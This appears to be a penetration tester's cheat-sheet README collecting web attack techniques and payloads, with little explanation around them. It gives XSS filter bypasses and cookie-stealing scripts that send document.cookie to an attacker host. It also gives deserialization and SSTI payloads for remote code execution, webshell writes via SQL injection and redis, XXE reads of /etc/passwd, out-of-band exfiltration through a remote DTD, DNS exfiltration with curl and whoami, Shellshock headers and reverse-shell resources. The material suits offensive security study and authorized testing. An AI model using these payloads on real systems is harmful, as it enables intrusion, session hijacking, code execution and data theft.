# Tricks - Web Penetration Tester

- [x] In construction...

## WAF

### Detection

-> Cookies

-> HTTP Response Messages

-> Rules

-> HTTP Status Code

### Tool's

-> wafw00f 

https://github.com/EnableSecurity/wafw00f

-> nmap --script=http-waf-fingerprint

https://nmap.org/nsedoc/scripts/http-waf-fingerprint.html

-> imperva-detect

https://raw.githubusercontent.com/vmfae-iscteiulpt/imperva-detect/master/imperva-detect.sh

-> bypass to find real ip in CloudFlare:

https://github.com/zidansec/CloudPeler

#### Others

https://github.com/0xInfection/Awesome-WAF

## Host Obfuscation

#### Types

-> DWORD
  
-> OCTAL 
  
-> HEX
  
-> HYBRID

### Tool

https://www.silisoftware.com/tools/ipconverter.php

## PHP Obfuscation Techniques:

### Mix - Hex + Octal

echo "t\x72\x69\143\153s";

//Tricks

### Variable Parsing

$a = "ri"; $b ="ck"; echo "T$a[0]$a[1]$b[0]$b[1]s";

//Tricks

### Variable Variables

$a = "T"; $$a = "ri"; $$$a = "cks"; echo $a.$T.$ri;

//Tricks

### PHP Non-Alphanumeric 

$\_="{"; #XOR char

echo $\_=($\_^"<").($\_^">").($\_^"/"); #XOR = GET

//GET

https://web.archive.org/web/20160516145602/http://www.thespanner.co.uk/2011/09/22/non-alphanumeric-code-in-php/

### PHP Obfuscation - base64+gzdeflate

codes/obufscation/obfuscation.php

https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/obfuscation/obfuscation.php

## Online PHP Executor

"3v4l.org (leetspeak for eval) is an online shell that allows you to run your code on my server. I compiled more than 250 different PHP versions (every version released since 4.3.0) for you to run online."

https://3v4l.org/

### PHP Obfuscation Decoders 

https://malwaredecoder.com/

https://hackvertor.co.uk/public

## Cross-Site Scripting (Reflected, Stored, DOM, Mutation, Poliglote)

### Protection XSS

-> XSS Auditor and XSS Filter

https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/xss.md

https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html

https://www.chromium.org/developers/design-documents/xss-auditor/

https://portswigger.net/daily-swig/xss-protection-disappears-from-microsoft-edge

https://developer.mozilla.org/pt-BR/docs/Web/HTTP/Headers/X-XSS-Protection

-> Wordlists for XSS Bypass

https://gist.githubusercontent.com/rvrsh3ll/09a8b933291f9f98e8ec/raw/535cd1a9cefb221dd9de6965e87ca8a9eb5dc320/xxsfilterbypass.lst

https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/XSS/XSS-Bypass-Strings-BruteLogic.txt

https://raw.githubusercontent.com/payloadbox/xss-payload-list/master/Intruder/xss-payload-list.txt

https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/XSS/XSS-Cheat-Sheet-PortSwigger.txt

### XSS Keylogger

https://rapid7.com/blog/post/2012/02/21/metasploit-javascript-keylogger/

https://github.com/hadynz/xss-keylogger

### XSS Mutation

http://www.businessinfo.co.uk/labs/mxss/

### XSS Poliglote

https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot

### Regex blacklist filtering

(on\w+\s*=)

<svc/onload=alert(1)>

<svg//////onload=alert(1)>

<svg id=x;onload=alert(1)>
  
<svg id=\`x\`onload=alert(1)>
  
(?i)([\s\"'`;\/0-9\=]+on\w+\s*=)
  
<svg onload%09=alert(1)>
  
<svg %09onload=alert(1)>
  
<svg %09onload%20=alert(1)>
  
<svg onload%09%20%28%2C%3B=alert(1)>
  
<svg onload%0B=alert(1)>

### Keyword based in filter
 
#### blocked - alert - bypass
  
-> <script>\u0061lert(1)</script>
  
-> <script>\u0061\u006C\u0065\u0072\u0074(1)</script>
  
-> <script>eval("\u0061lert(1)")</script>
  
-> <script>eval("\u0061\u006C\u0065\u0072\u0074\u0028\u0031\u0029")</script> 
  
#### Removing HTML Tags
  
<scr<iframe>ipt>alert(1)</script>
  
### Scaping Quote
  
### Methods
  
-> String.fromCharCode()
  
-> unescape

Ex:
 
-> decode URI + unescape method
  
decodeURI(/alert(%22xss%22)/.source)
  
decodeURIComponent(/alert(%22xss%22)/.source)
  
Add execution sink for execution:
  
-> eval
  
### Escaping Parentheses
  
\<img src=x onerror="\u0061lert(1)"/>
  
\<img src=x onerror="eval('\141lert(1)')"/>

\<img src=x onerror="eval('\x61lert(1)')"/>
  
### Others Examples
  
#### HTML Tag
  
\<div>
  
here
  
\</div>

-> <svg/onload=alert(1)

#### HTML Tag Attributes

<input value="here"/></input>
 
-> adaa"> <a/href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTs8L3NjcmlwdD4=">show</!--
  
#### Script Tag
  
<script>
  
var name="here";
  
</div>
  
</script>
  
-> ;alert(1);//

#### Event Attributes

\<button onclick="reserve(here);">
  
Okay!
  
</button>

-> alert(1)

Dom Based
  
\<script>var ok = location.search.replace("?ok=", "");domE1.innerHTML = "<a href=\'"+ok+"\'>ok</a>";</script>
  
-> javascript:alert(1)

### JavaScript Encoding and Compressor:

-> jjencode, aaencode, jsfuck, Minifying,Packer

### Decoder - Obfuscation (PHP and Javascript Decoder)
  
https://malwaredecoder.com/

## XSS - Session Hijacking
  
ex:
  
\<script type=“text/javascript”>document.location=“http://ip:port/?cookie=“+document.cookie;</script>

\<script>window.location="http://ip:port/?cookie="+document.cookie;</script>

## Type Juggling

https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf

### PHP - others tricks

[ eval () execute a chain whose variable $ HTTP_USER_AGENT is so just
change your header in PHP code ]

https://www.exploit-db.com/papers/13694

## Insecure Deserialization 

-> Binary

-> Human-readable

### PHP Deserialization

#### PHP - Method Serialization:

-> serialize()

-> unserialize()

#### Magic Methods:

-> __construct()

-> __destruct()

-> __wakUp()

#### Class Properties

Public \<s>
 
Ex:

O:4:"Okay":1:{s:8:"filepath";s:11:"/tmp/ok.txt";}
  
Protected \0 * \0

Ex:

O:4:"Okay":1:{s:11:"' . "\0" . '*' . "\0" . 'filepath";s:11:"/tmp/ok.txt";}

Private \0 \<s> \0

Ex:
  
O:4:"Okay":1:{s:14:"' . "\0" . 'Okay' . "\0" . 'filepath";s:11:"/tmp/ok.txt";}

codes/deserialization/example.php
  
https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/deserialization/php/example.php
  
#### Trick Bypass

a:2:{s:8:"anything";o:4:"Okay":1:{s:8:"filepath";s:11:"/tmp/ok.txt";}}

### Tool

https://github.com/ambionics/phpggc
  
### Others 

codes/deserialization/php/token_hmac_sha1.php
  
https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/deserialization/php/token_hmac_sha1.php

### .NET Deserialization

#### Methods Serialization:

-> Binary Formatter

-> DataContractSerializer

-> NetDataContractSerializer

-> XML Serialization
  
#### Most common places to find serialized data

-> VIEWSTATE
    
-> .NET remoting services
  
#### Tool

https://github.com/pwntester/ysoserial.net

### Java Deserialization

#### Identify

-> import java.io.serializable

-> binary with ac ed 00 05

-> base64 starts with rO0AB in web applications
  
#### java.lang.Runtime.exec()
  
bash -c {echo,payload_base64}|{base64,-d}|{bash,-i}

https://www.bugku.net/runtime-exec-payloads/

#### Tools

https://github.com/frohoff/ysoserial

https://github.com/NickstaDB/SerializationDumper

https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java
  
#### Script
  
codes/deserialization/java/gserial.sh
  
https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/deserialization/java/gserial.sh
  
codes/deserialization/java/payload.txt

https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/deserialization/java/payloads.txt
  
while read payload; 
  
do echo "$payload\n\n"; 
  
java -jar ysoserial.jar $payload "sleep 5" | base64 | tr -d '\n' > $payload.ser; 
  
echo "-----------------Loading-----------------\n\n"; done < payloads.txt
 
#### Signals
  
-> Bad Sign

ClassNot FoundException

-> Good Sign

java.io.IOException
  
#### JRMPListener and JRMPClient (CommonsCollections)
  
java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener 80 CommonsCollections “curl http://ip:port/shell.php -o /var/www/shell.php”

java -jar ysoserial-all.jar “JRMPClient” ip:80” |base64 -w0
  
### Python Deserialization

#### Pickle
  
codes/deserialization/python/py_pickle.py

https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/deserialization/python/py_pickle.py

### YAML Deserialization
  
codes/deserialization/exploit.yaml

https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/deserialization/yaml/exploit.yaml
  
## Cloud

### Meta-data

http://169.254.169.254/latest/meta-data

http://169.254.169.254/latest/api/token

### Serverless Injection

echo "hi" > ok.txt && aws s3 cp ok.txt 's3://<BUCKET>/' -acl -public-read
  
### Tools

https://github.com/clarketm/s3recon
 
https://github.com/RhinoSecurityLabs/pacu
  
## XPATH
  
error()

* and doc('http://hacker.site/')
  
* and doc('http://hacker.site/', name(/*) ))
  
### Tools
  
https://xcat.readthedocs.io/en/latest/
  
### Wordlists for SQLI e XPath - Authentication Bypass

https://raw.githubusercontent.com/payloadbox/sql-injection-payload-list/master/Intruder/exploit/Auth_Bypass.txt
  
## Padding Oracle Attack
  
### Identify

-> rememberMe: (Cookie)

### Exploiting 

java -jar ysoserial.jar CommonsBeanutils1 "touch /tmp/success" > payload.class

https://github.com/frohoff/ysoserial

python shiro_exp.py site.com/home.jsp cookie payload.class

https://github.com/wuppp/shiro_rce_exp/blob/master/shiro_exp.py
  
## Hash Length Extension Attack

https://github.com/iagox86/hash_extender

https://site.com/index.php?file=oktest&hash=hash

./hash_extender -f sha1 --data 'oktest' -s hash --append '../../../../../../../../../etc/passwd' --secret-min=10 --secret-max=40 --out-data-format=html --table > payloads.out

burp intruder -> payloads.out in file parameter.  
  
## Insecure - Machine Key for RCE 

https://github.com/carlospolop/hacktricks/blob/master/pentesting-web/deserialization/exploiting-__viewstate-parameter.md
  
https://github.com/pwntester/ysoserial.net
  
https://github.com/NotSoSecure/Blacklist3r/tree/master/MachineKey/AspDotNetWrapper
  
### Others Docs

https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/

## Local File Inclusion - LFI

### LFI - files for fuzzing

### Wordlist LFI - Linux

https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt

### Wordlist LFI - Windows

https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt

### Payloads for bypass:

-> bypass_lfi.txt
  
### Wordlist for parameter fuzzing
  
https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/burp-parameter-names.txt
  
### Wordlist for subdomain fuzzing
  
https://github.com/danielmiessler/SecLists/tree/master/Discovery/DNS

## SQL Injection
  
### WAF BYPASS

#### Query default:

'UNION SELECT 1, name,3,4 from users; -- -

#### Add comment /* */ for space bypass

'UNION/\*\*/SELECT/\*\*/1,name,3,4/**/from/**/users; -- -

#### Add comment /\*!\*/ in query for filters bypass

'/\*!UNION SELECT\*/ 1,group_concat(name),3,4 from users; -- -

#### Add random case

'UnIoN SeLeCt 1,GrOuP_cOnCaT(nAme),3,4 FrOm users; -- -

#### Example of mix:

'/\*!UnIoN/\*\*/SeLeCt/\*\*/\*/1,GroUp_ConCat(nAmE),3,4/\*\*/FrOm/\*\*/users; -- -

#### Others Techniques:

-> urlencode (example:%20 instead of space);
  
-> Scientifc Notation;
  
-> hexadecimal, substr, etc...
  
### Webshell via SQLI
  
select "\<?php system($_GET['cmd']);?>" into outfile "/var/www/html/shell.php";
  
### SQL Injection Second-Order (query connector)

codes/sqli/second_order/script.php

https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/sqli/second-order/script.php

### Webshell via redis

redis-cli -h ip

config set dir /var/www/html

config set dbfilename ok.php

set test "\<?php system($_GET['okay'); ?>" 

save

#### Study

https://tryhackme.com/room/sqlilab

### SQL Injection Out-Of-Band, etc

https://book.hacktricks.xyz/pentesting-web/sql-injection
  
### Tamper's SQLMAP
  
-> randomcase.py
  
-> order2ascii.py

-> xforwardedfor.py
 
### XPATH NOTATION
  
%' and extractvalue(0x0a,concat(0x0a,(select database() limit 1))) -- -
  
### Wordlist for SQL Injection - Bypass

https://gist.githubusercontent.com/zetc0de/f4146eb278805946ab064a753eac6a02/raw/e126452093b9cde7f82eff14a15f8ceca8188701/sqli-bypass-waf.txt

### Doc for SQL Injection - Bypass

https://github.com/OWASP/www-community/blob/master/pages/attacks/SQL_Injection_Bypassing_WAF.md
  
### Others
  
codes/sqli/time-based/sqli.py
  
https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/sqli/time-based/sqli.py
  
codes/sqli/tampers/second-order.py

https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/sqli/tampers/second-order.py
  
## NOSQL Injection
  
https://book.hacktricks.xyz/pentesting-web/nosql-injection
  
## Graphql Introspection

https://ivangoncharov.github.io/graphql-voyager/
  
## CSRF

codes/csrf/csrf.html
  
https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/csrf/csrf.html
  
codes/csrf/csrf_json.html
  
https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/csrf/csrf_json.html
  
codes/csrf/csrf_json_xhr.html
  
https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/csrf/csrf_json_xhr.html
  
codes/csrf/csrf_token_bypass.html
  
https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/csrf/csrf_token_bypass.html
  
### Analyze the token and perform brute-force

burp intruder -> sequencer -> Token Location Within Response -> Start live capture -> save tokens

cat tokens.txt | uniq -c | nl 
  
## SSTI

### Identify

-> Jinja2 or Twig
  
{{3*3}}

-> Smarty or Mako
  
{3*3}

-> ERB(Ruby)
  
<%= 7*7 %>

-> FreeMarker
  
#{3*3}

-> Others 
    
${3*3}
  
${{3*3}}

3*3

### Java Expression Language

{{T(java.lang.Runtime).getRuntime().exec('id')}}

''.class.forName('java.lang.Runtime').getRuntime().exec('id')

### FreeMarker

\<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}

### Python - Secret Key
  
{{settings.SECRET_KEY}}
  
### Doc for SSTI	

https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection
  
## SSRF - Protocol Smuggling

-> HTTP-Based(Elastic, CouchDB, Mongodb, docker),etc.

-> Text-Based(ftp(21), smtp(587), zabbix(10051), mysql(3306), redis(6379), memcached(11211), etc.

gopher://127.0.0.1:port/_

### Scripts

codes/ssrf_protocol_smuggling/memcached.py
  
https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/ssrf_protocol_smuggling/memcached.py 

codes/ssrf_protocol_smuggling/zabbix.py
  
https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/ssrf_protocol_smuggling/zabbix.py

### Tool's

-> Gopherus

https://github.com/tarunkant/Gopherus
  
### Scripts

codes/ssrf_protocol_smuggling/zabbix.py
  
codes/ssrf_protocol_smuggling/memcached.py
  
-> stats items
  
-> stats cachedump <slab class> <number of items to dump>
  
-> get \<item>
  
### Docs for SSRF

https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf

https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery
  
## CRLF Injection
  
/%0d%0aLocation:

/%0d%0a%0d%0a\<svg onload=(0)>

## XXE

### Methods:

\<!ENTITY % file SYSTEM "file:///etc/passwd">
\<!ENTITY % file SYSTEM "php://filter/zlib.deflate/read=convert.base64-encode/resource=/etc/passwd">
\<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">

## XXE - Blind Out-Of-Band

### Exfiltrate data exfiltrating data via dtd

-> Part 1

\<!DOCTYPE r[

\<!ELEMENT r ANY>

\<!ENTITY % ult SYSTEM "http://ip/evil.dtd">

%ult;

%int;

]>

<r>&exfil;</r>

-> Part 2
  
codes/xxe/evil.dtd
  
https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/xxe/evil.dtd
  
\<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/passwd">
  
\<!ENTITY % int "\<!ENTITY exfil SYSTEM 'http://ip/?leak=%file;'>">
  
### Retrieve data via error messages with dtd file
  
codes/xxe/error.dtd
  
https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/xxe/error.dtd

-> Part 1

\<!DOCTYPE foo [

\<!ENTITY % xxe SYSTEM "https://ip/evil.dtd"> 

%xxe;

%payload;

%remote;

]>

-> Part 2

\<!ENTITY % file SYSTEM "file:///etc/passwd">

\<!ENTITY % payload "\<!ENTITY &#37; remote SYSTEM 'file:///idonotexist/%file;'>">
  
### XInclude to retrieve files with dtd file

\<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/>\</foo>

### Image file upload

code/xxe/evil.svg

https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/xxe/evil.svg
  
\<?xml version="1.0" standalone="yes"?>\<!DOCTYPE test [ \<!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>\<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">\<text font-size="16" x="0" y="16">&xxe;\</text>\</svg>

## XSLT Server Side Injection
  
https://book.hacktricks.xyz/pentesting-web/xslt-server-side-injection-extensible-stylesheet-languaje-transformations

## Prototype Pollution

### Client Side
  
https://github.com/BlackFan/client-side-prototype-pollution
  
### Server Side

-> exec.exec in req body with lodash - application/json
  
https://nodejs.org/api/child_process.html#child_processexeccommand-options-callback

"__proto__":{
  
  "shell":"sleep 5"
  
}
  
-> exec.fork in req body with lodash - application/json
  
https://nodejs.org/api/process.html
  
"__proto__":{
  
    "execPath":"/bin/bash",
  
    "execArgv":[
  
    "-c",
  
    "sleep 5"
  
    ]
  
  }

### RCE - Exfiltrating via dns

curl http://$(whoami).site.com/

curl http://\`whoami\`.site.com/

### Shellshock

User-Agent: () { :; }; /usr/bin/nslookup $(whoami).site.com

### CMS

#### Wordpress

-> Tool

wpscan --url http://site.com/wordpress --api-token your_token --enumarate vp --plugins-detection aggressive

https://wpscan.com/wordpress-security-scanner

#### Joomla!

-> Tool

https://github.com/oppsec/juumla

#### Drupal

-> Tool

https://github.com/SamJoan/droopescan

## Fuzzing (+)
  
### DNS

ffuf -u https://FUZZ.site.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt

### VHOST
  
ffuf  -u http://site.com -H 'Host: FUZZ.site.com' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-11000.txt -fs xxx

### Fuzzing File Extension
  
ffuf -u http://site.com -w web-extensions.txt 

### Fuzzing Parameter GET

ffuf -u "http://site.com/index.php?FUZZ=ok" -w wordlist.txt -fs xxx  
  
### Fuzzing Parameter POST
  
ffuf -u "http://site.com/index.php" -X POST -d 'FUZZ=ok' -H 'Content-Type: application/x-www-form-urlencoded' -w wordlist.txt -fs xxx

## Web Recon (+)
  
## Others tool's and things
  
### ImageTragik

codes/others/tragik.jpg
  
https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/rce/tragik.jpg
  
### Search across a half million git repos
  
https://grep.app
  
### The Cyber Swiss Army Knife - a web app for encryption, encoding, compression and data analysis.
  
https://gchq.github.io/CyberChef/
  
### List of file signatures
  
https://en.wikipedia.org/wiki/List_of_file_signatures

### Regex 
  
https://regex101.com/

### Encode for SQL Injection in Json
  
https://dencode.com/string/unicode-escape
  
### Wildcard DNS

https://nip.io/
  
### Explain Shell

https://explainshell.com/
  
### Webhook online
  
https://webhook.site/#!/b3d5ed21-b58d-4a77-b19d-b7cdc2eeadc0
  
### Reverse Shell
  
https://www.revshells.com/
 
### Api Security

https://platform.42crunch.com/
